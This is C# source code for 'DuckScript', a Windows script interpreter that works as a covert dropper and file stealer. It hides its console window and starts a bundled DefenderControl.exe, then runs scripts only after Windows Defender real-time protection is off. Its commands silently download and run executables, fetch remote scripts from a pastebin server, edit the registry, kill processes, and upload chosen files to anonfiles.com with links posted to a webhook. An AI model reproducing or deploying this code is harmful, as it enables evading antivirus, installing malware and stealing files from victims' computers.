#region using
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
#endregion

namespace DuckScript
{
    class Program
    {
        #region Settings
        public static string username = "";
        public static string webhook = "";
        public static string errorwebhook = "";
        public static string errors = "true";
        public static string debug = "true";
        public static string pastebinserver = "";
        #endregion

        #region Variables
        [DllImport("user32.dll")]
        static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        internal static extern IntPtr SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
        [DllImport("user32.dll")]
        private static extern int GetWindowRect(IntPtr hwnd, out Rectangle rect);

        public static string loc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static WebClient wc = new WebClient();
        public static bool payloadsRequested = false;
        public static bool payloadDownloaded = false;
        public static List<string> payloadarg1List = new List<string>();
        public static List<string> payloadarg2List = new List<string>();
        public static List<string> payloadarg3List = new List<string>();
        public static List<string> payloadarg4List = new List<string>();
        public static List<string> payloadarg5List = new List<string>();
        #endregion

        #region Startup
        static void Main(string[] args)
        {
            if (IsAdministrator())
                Console.Title = "DuckScript 1.0.0.0 [Administrator]";
            else
                Console.Title = "DuckScript 1.0.0.0";
            
            bool nosettingsupdate = false;
            try
            {
                if (!File.Exists(loc + @"\DuckScript\DuckScript.ico"))
                    AddFileExtension();
            }
            catch (UnauthorizedAccessException)
            {
                CallError(".duck extension not installed!\nRun as Administrator to install!");
            }
            catch (Exception ex)
            {
                CallError(ex.ToString());
            }
            string payloads = "";
            try { payloads = File.ReadAllText(args[0]); }
            catch
            {
                try
                {
                    if (args[1].ToLower() == "/nosettingsupdate")
                        nosettingsupdate = true;
                }
                catch { }
                redo:
                debug = "true";
                Console.Write("Script path: ");
                string path = Console.ReadLine().Replace("\"", "");
                if (File.Exists(path))
                {
                    if (path.ToLower().Contains(".duck"))
                        payloads = File.ReadAllText(path);
                    else
                        Console.WriteLine("File is not a duck script!");
                }
                else
                {
                    Console.WriteLine("File not existing!");
                    goto redo;
                }
            }

            var handle = GetConsoleWindow();
            if (debug != "true")
                ShowWindow(handle, 0);

            int attempts = 0;
            retry:
            try
            {
                attempts++;

                if (!IsAntiVirusOff() && File.Exists(Environment.CurrentDirectory + @"\DefenderControl.exe"))
                    Process.Start(Environment.CurrentDirectory + @"\DefenderControl.exe");

                int attempts2 = 0;
                reCheck:
                attempts2++;
                if (IsAntiVirusOff())
                {
                    executePayloads(payloads, nosettingsupdate);
                }
                else
                {
                    Thread.Sleep(1000);
                    if (attempts2 < 60) { goto reCheck; }
                }
                Environment.Exit(69);
            }
            catch
            {
                if (attempts > 5)
                {
                    Environment.Exit(420);
                }
                goto retry;
            }
        }
        #endregion

        #region Functions
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static string FixString(string content)
        {
            string newcontent = content
                    .Replace("%LOCALAPPDATA%", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))
                    .Replace("%APPDATA%", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData))
                    .Replace("%COMMONAPPDATA%", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))
                    .Replace("%TEMP%", Path.GetTempPath())
                    .Replace("%DESKTOP%", Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
                    .Replace("%DOCUMENTS%", Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
                    .Replace("%ADMINTOOLS%", Environment.GetFolderPath(Environment.SpecialFolder.AdminTools))
                    .Replace("%PROGRAMFILES%", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles))
                    .Replace("%PROGRAMFILESX86%", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86))
                    .Replace("%PROGRAMS%", Environment.GetFolderPath(Environment.SpecialFolder.Programs))
                    .Replace("%COOKIES%", Environment.GetFolderPath(Environment.SpecialFolder.Cookies))
                    .Replace("%STARTUP%", Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                    .Replace("%STARTUPMENU%", Environment.GetFolderPath(Environment.SpecialFolder.StartMenu))
                    .Replace("%MUSIC%", Environment.GetFolderPath(Environment.SpecialFolder.MyMusic))
                    .Replace("%SYSTEM%", Environment.GetFolderPath(Environment.SpecialFolder.System))
                    .Replace("%WINDOWS%", Environment.GetFolderPath(Environment.SpecialFolder.Windows))
                    .Replace("%USERPROFILE%", Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
                    .Replace("%RESOURCES%", Environment.GetFolderPath(Environment.SpecialFolder.Resources))
                    .Replace("%CURRENTPATH%", Environment.CurrentDirectory)
                    .Replace("%DUCK%", loc + @"\DuckScript\")
                    .Replace("%CURRENTIME%", DateTime.Now.ToString())
                    .Replace("%CURRENTIMEUTC%", DateTime.UtcNow.ToString())
                    .Replace("%USERNAME%", Environment.UserName)
                    .Replace("%USERDOMAINNAME%", Environment.UserDomainName)
                    .Replace("%MACHINENAME%", Environment.MachineName);

            return newcontent;
        }

        public static string FixKeys(string content)
        {
            string newcontent = content.ToLower()
                .Replace("%backspace%", "{BS}")
                .Replace("%break%", "{BREAK}")
                .Replace("%capslock%", "{CAPSLOCK}")
                .Replace("%delete%", "{DEL}")
                .Replace("%down%", "{DOWN}")
                .Replace("%end%", "{END}")
                .Replace("%enter%", "{ENTER}")
                .Replace("%esc%", "{ESC}")
                .Replace("%help%", "{HELP}")
                .Replace("%home%", "{HOME}")
                .Replace("%insert%", "{INS}")
                .Replace("%left%", "{LEFT}")
                .Replace("%numlock%", "{NUMLOCK}")
                .Replace("%pgdn%", "{PGDN}")
                .Replace("%pgup%", "{PGUP}")
                .Replace("%prtsc%", "{PRTSC}")
                .Replace("%right%", "{RIGHT}")
                .Replace("%scrolllock%", "{SCROLLLOCK}")
                .Replace("%tab%", "{TAB}")
                .Replace("%up%", "{UP}")
                .Replace("%f1%", "{F1}")
                .Replace("%f2%", "{F2}")
                .Replace("%f3%", "{F3}")
                .Replace("%f4%", "{F4}")
                .Replace("%f5%", "{F5}")
                .Replace("%f6%", "{F6}")
                .Replace("%f7%", "{F7}")
                .Replace("%f8%", "{F8}")
                .Replace("%f9%", "{F9}")
                .Replace("%f10%", "{F10}")
                .Replace("%f11%", "{F11}")
                .Replace("%f12%", "{F12}")
                .Replace("%add%", "{ADD}")
                .Replace("%subtract%", "{SUBTRACT}")
                .Replace("%multiply%", "{MULTIPLY}")
                .Replace("%divide%", "{DIVIDE}");

            return newcontent;
        }

        public class AutoClosingMessageBox
        {
            System.Threading.Timer _timeoutTimer;
            string _caption;
            AutoClosingMessageBox(string text, string caption, int timeout)
            {
                _caption = caption;
                _timeoutTimer = new System.Threading.Timer(OnTimerElapsed,
                    null, timeout, Timeout.Infinite);
                using (_timeoutTimer)
                    MessageBox.Show(text, caption);
            }
            public static void Show(string text, string caption, int timeout)
            {
                new AutoClosingMessageBox(text, caption, timeout);
            }
            void OnTimerElapsed(object state)
            {
                IntPtr mbWnd = FindWindow("#32770", _caption);
                if (mbWnd != IntPtr.Zero)
                    SendMessage(mbWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                _timeoutTimer.Dispose();
            }
            const int WM_CLOSE = 0x0010;
            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
        }

        public static void sendWebHook(string msg, string username, bool error = false)
        {
            if (webhook != "")
            {
                if (error == false)
                {
                    Post(webhook, new NameValueCollection()
                    {
                        { "username", username },
                        { "content", msg }
                    });
                }
                else
                {
                    Post(errorwebhook, new NameValueCollection()
                    {
                        { "username", username },
                        { "content", msg }
                    });
                }
            }
        }

        public static byte[] Post(string uri, NameValueCollection pairs)
        {
            byte[] numArray;
            using (WebClient webClient = new WebClient())
            {
                numArray = webClient.UploadValues(uri, pairs);
            }
            return numArray;
        }

        public static bool IsAntiVirusOff()
        {
            var regkey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            if (regkey != null)
            {
                var subkey = regkey.OpenSubKey(@"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection");
                var val = subkey.GetValue("DisableRealtimeMonitoring");
                if (val != null && val is Int32)
                {
                    var value = (int)val;
                    if (value == 1)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
            return false;
        }

        public static void AddFileExtension()
        {
            if (!Directory.Exists(loc + @"\DuckScript"))
                Directory.CreateDirectory(loc + @"\DuckScript");

            try { File.Copy(Application.ExecutablePath, loc + @"\DuckScript\DuckScript.exe"); } catch { }
            Registry.ClassesRoot.CreateSubKey(".duck").SetValue("", "DuckScript", RegistryValueKind.String);
            Registry.ClassesRoot.CreateSubKey(@"DuckScript\shell\open\command").SetValue("", loc + @"\DuckScript\DuckScript.exe" + " \"%1\" ", RegistryValueKind.String);
            File.WriteAllBytes(loc + @"\DuckScript\DuckScript.ico", Properties.Resource1.icon);
            Registry.ClassesRoot.CreateSubKey(@"DuckScript\DefaultIcon").SetValue("", loc + @"\DuckScript\DuckScript.ico", RegistryValueKind.String);
            var color = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(".duck extension installed!");
            Console.ForegroundColor = color;
        }

        public static void CallError(string error)
        {
            if (errors == "true")
            {
                if (errorwebhook != "")
                {
                    sendWebHook(error.ToString(), username);
                }
                else
                {
                    var color = Console.ForegroundColor;
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(error);
                    Console.ForegroundColor = color;
                }
            }
        }
        #endregion

        #region ScriptReader
        public static void executePayloads(string payloads, bool nosettingsupdate)
        {
            wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
            string panelData = payloads;
            if (panelData == "")
            {
                panelData = File.ReadAllText(payloads);
            }
            
            string[] allPayloads = panelData.Split('\n');
            int nr = -1;
            foreach (var payload in allPayloads)
            {
                nr++;
                
                if (!payload.StartsWith("#"))
                {
                    try
                    {
                        string payloadarg1 = "";
                        string payloadarg2 = "";
                        string payloadarg3 = "";
                        string payloadarg4 = "";
                        string payloadarg5 = "";
                        try
                        {
                            payloadarg1 = payload.Split('"')[1];
                            payloadarg1 = FixString(payloadarg1);
                        }
                        catch { }

                        try
                        {
                            payloadarg2 = payload.Split('"')[3];
                            payloadarg2 = FixString(payloadarg2);
                        }
                        catch { }

                        try
                        {
                            payloadarg3 = payload.Split('"')[5];
                            payloadarg3 = FixString(payloadarg3);
                        }
                        catch { }

                        try
                        {
                            payloadarg4 = payload.Split('"')[7];
                            payloadarg4 = FixString(payloadarg4);
                        }
                        catch { }

                        try
                        {
                            payloadarg5 = payload.Split('"')[9];
                            payloadarg5 = FixString(payloadarg5);
                        }
                        catch { }

                        payloadarg1List.Add(payloadarg1);
                        payloadarg2List.Add(payloadarg2);
                        payloadarg3List.Add(payloadarg3);
                        payloadarg4List.Add(payloadarg4);
                        payloadarg5List.Add(payloadarg5);
                        if (payloadarg1.ToLower() == "/updatesettings" || payloadarg1.ToLower() == "/updatesetting")
                        {
                            if (!nosettingsupdate)
                                UpdateSettings(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/start" || payloadarg1.ToLower() == "/open")
                        {
                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = payloadarg2;
                            if (payloadarg3 != "") { startInfo.Arguments = payloadarg3; }
                            startInfo.UseShellExecute = false;
                            startInfo.RedirectStandardOutput = true;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            Process.Start(startInfo);
                        }
                        else if (payloadarg1.ToLower() == "/kill" || payloadarg1.ToLower() == "/end")
                        {
                            Process[] processRunning = Process.GetProcesses();
                            foreach (Process pr in processRunning)
                            {
                                if (pr.ProcessName.ToLower().Contains(payloadarg2))
                                {
                                    pr.Kill();
                                }
                            }
                        }
                        else if (payloadarg1.ToLower() == "/sleep" || payloadarg1.ToLower() == "/wait")
                        {
                            Thread.Sleep(Convert.ToInt32(payloadarg2));
                        }
                        else if (payloadarg1.ToLower() == "/deletefile" || payloadarg1.ToLower() == "/removefile")
                        {
                            if (File.Exists(payloadarg2))
                            {
                                File.Delete(payloadarg2);
                            }
                        }
                        else if (payloadarg1.ToLower() == "/getfile" || payloadarg1.ToLower() == "/grabfile")
                        {
                            SendFile(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/modifyfile" || payloadarg1.ToLower() == "/editfile")
                        {
                            ModifyFile(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/setregkey" || payloadarg1.ToLower() == "/editregkey")
                        {
                            SetRegKey(payloadarg2, payloadarg3, payloadarg4, payloadarg5);
                        }
                        else if (payloadarg1.ToLower() == "/delregkey" || payloadarg1.ToLower() == "/removeregkey")
                        {
                            DelRegKey(payloadarg2, payloadarg3, payloadarg4);
                        }
                        else if (payloadarg1.ToLower() == "/shownote" || payloadarg1.ToLower() == "/note")
                        {
                            ShowNote(payloadarg2, payloadarg3);
                        }
                        else if (payloadarg1.ToLower() == "/showmessage" || payloadarg1.ToLower() == "/msg")
                        {
                            new Thread(() => ShowMessage(payloadarg2, payloadarg3)).Start();
                        }
                        else if (payloadarg1.ToLower() == "/downloadfile" || payloadarg1.ToLower() == "/downloadpayload")
                        {
                            RunPayload(payloadarg2, payloadarg3, payloadarg4);
                        }
                        else if (payloadarg1.ToLower() == "/runscript" || payloadarg1.ToLower() == "/runonlinescript")
                        {
                            RunOnlineScript(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/focuswindow" || payloadarg1.ToLower() == "/focus")
                        {
                            FocusWindow(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/setwindowstate" || payloadarg1.ToLower() == "/setwindow")
                        {
                            SetWindowState(payloadarg2, payloadarg3, payloadarg4, payloadarg5);
                        }
                        else if (payloadarg1.ToLower() == "/sendkey" || payloadarg1.ToLower() == "/sendkeys")
                        {
                            SendKey(payloadarg2);
                        }
                        else if (payloadarg1.ToLower() == "/cleanall" || payloadarg1.ToLower() == "/cleanduck")
                        {
                            DirectoryInfo di = new DirectoryInfo(loc + @"\winver\DuckScript\");
                            foreach (FileInfo file in di.GetFiles())
                            {
                                file.Delete();
                            }
                            foreach (DirectoryInfo dir in di.GetDirectories())
                            {
                                dir.Delete(true);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        var color = Console.ForegroundColor;
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(ex.ToString());
                        Console.ForegroundColor = color;
                    }
                }
            }
        }
        #endregion

        #region Commands
        public static void RunPayload(string path, string downloadurl, string arguments)
        {
            payloadDownloaded = false;
            if (!path.Contains("\\"))
            {
                wc.DownloadFileAsync(new Uri(downloadurl), loc + @"\DuckScript\" + path);
                path = loc + @"\DuckScript\" + path;
            }
            else
            {
                wc.DownloadFileAsync(new Uri(downloadurl), path);
            }
            while (!payloadDownloaded) { }
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = path;
            if (arguments != "") { startInfo.Arguments = arguments; }
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (arguments.ToLower() == "/checkantivirus")
            {
                if (!IsAntiVirusOff())
                {
                    Process.Start(startInfo);
                    while (!IsAntiVirusOff()) { Thread.Sleep(1000); }
                }
            }
            if (arguments.ToLower() != "/norun")
            {
                Process.Start(startInfo);
            }
        }

        public static void Wc_DownloadFileCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            payloadDownloaded = true;
        }

        public static void RunOnlineScript(string nosettings)
        {
            string[] data = { wc.DownloadString(pastebinserver), nosettings.ToLower() };
            Thread tr = new Thread(new ThreadStart(() => Main(data)));
            tr.Start();
            tr.Join();
            try { tr.Abort(); } catch { }
        }

        public static void SendKey(string content)
        {
            SendKeys.SendWait(FixKeys(content));
        }

        public static void FocusWindow(string windowname)
        {
            IntPtr hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == windowname)
                {
                    hWnd = pr.MainWindowHandle;
                    ShowWindow(hWnd, 3);
                    SetForegroundWindow(hWnd);
                }
            }
        }

        public static void SetWindowState(string windowname, string state, string location, string size)
        {
            IntPtr hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName.ToLower().Contains(windowname.ToLower()))
                {
                    hWnd = pr.MainWindowHandle;
                    Rectangle wnd;
                    GetWindowRect(hWnd, out wnd);

                    int currentLocationX = wnd.X;
                    int currentLocationY = wnd.Y;
                    int currentSizeX = wnd.Width;
                    int currentSizeY = wnd.Height;
                    int newLocationX = Convert.ToInt32(location.Split(',')[0]);
                    int newLocationY = Convert.ToInt32(location.Split(',')[1]);
                    int newSizeX = Convert.ToInt32(size.Split(',')[0]);
                    int newSizeY = Convert.ToInt32(size.Split(',')[1]);
                    
                    if (state.ToLower() == "size")
                    {
                        MoveWindow(hWnd, currentLocationX, currentLocationY, newSizeX, newSizeY, true);
                    }
                    else if (state.ToLower() == "location")
                    {
                        MoveWindow(hWnd, newLocationX, newLocationY, currentSizeX, currentSizeY, true);
                    }
                    else if (state.ToLower() == "both")
                    {
                        MoveWindow(hWnd, newLocationX, newLocationY, newSizeX, newSizeY, true);
                    }
                }
            }
        }

        public static void UpdateSettings(string setting, string value)
        {
            if (setting.ToLower() == "webhook")
            {
                webhook = value;
            }
            else if (setting.ToLower() == "errorwebhook")
            {
                errorwebhook = value;
            }
            else if (setting.ToLower() == "username")
            {
                username = value;
            }
            else if (setting.ToLower() == "errors")
            {
                errors = value;
            }
            else if (setting.ToLower() == "debug")
            {
                debug = value;
            }
        }

        public static void SetRegKey(string location, string path, string keyname, string newvalue)
        {
            if (location.ToLower() == "localmachine")
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "currentuser")
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "user")
            {
                RegistryKey reg = Registry.Users.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
            else if (location.ToLower() == "classesroot")
            {
                RegistryKey reg = Registry.ClassesRoot.OpenSubKey(path);
                reg.SetValue(keyname, newvalue);
                reg.Close();
            }
        }
        public static void DelRegKey(string path, string location, string keyname)
        {
            if (location.ToLower() == "localmachine")
            {
                RegistryKey reg = Registry.LocalMachine.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
            else if (location.ToLower() == "currentuser")
            {
                RegistryKey reg = Registry.CurrentUser.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
            else if (location.ToLower() == "user")
            {
                RegistryKey reg = Registry.Users.OpenSubKey(path);
                reg.DeleteValue(keyname);
                reg.Close();
            }
        }

        public static void ShowMessage(string content, string title)
        {
            if (content != "")
            {
                MessageBox.Show(content, title);
            }
        }

        public static void ShowNote(string filename, string content)
        {
            if (content != "")
            {
                filename = filename.Replace(".txt", "");
                string path = Path.GetTempPath() + @"\" + filename + ".txt";
                File.WriteAllText(path, content);
                Process.Start(path);
                Thread.Sleep(1000);
                File.Delete(path);
            }
        }

        public static void ModifyFile(string filePath, string downloadlink)
        {
            if (File.Exists(filePath))
            {
                File.Delete(filePath);
                wc.DownloadFile(downloadlink, filePath);
            }
        }

        public static void SendFile(string filePath)
        {
            string ReturnValue = "";
            int attempts = 0;
            try
            {
                retry:
                attempts++;
                if (File.Exists(filePath))
                {
                    byte[] Response = wc.UploadFile("https://api.anonfiles.com/upload", filePath);
                    string ResponseBody = Encoding.ASCII.GetString(Response);
                    if (ResponseBody.Contains("\"error\": {"))
                    {
                        ReturnValue += "There was a erorr while uploading the file.\r\n";
                        ReturnValue += "Error message: **" + ResponseBody.Split('"')[7] + "**\r\n";
                    }
                    else
                    {
                        ReturnValue += "Download link: **" + ResponseBody.Split('"')[15] + "**\r\n";
                        ReturnValue += "File name: **" + ResponseBody.Split('"')[25] + "**\r\n";
                    }
                    sendWebHook(ReturnValue, username);
                }
                else
                {
                    if (attempts < 10)
                    {
                        Thread.Sleep(500);
                        goto retry;
                    }
                    else
                    {
                        ReturnValue = "File Grab failed since file did not exist at: **" + filePath + "**";
                        sendWebHook(ReturnValue, username);
                    }   
                }
            }
            catch
            {
                ReturnValue = "Failed to grab file at: **" + filePath + "**";
                sendWebHook(ReturnValue, username);
            }
        }
        #endregion
    }
}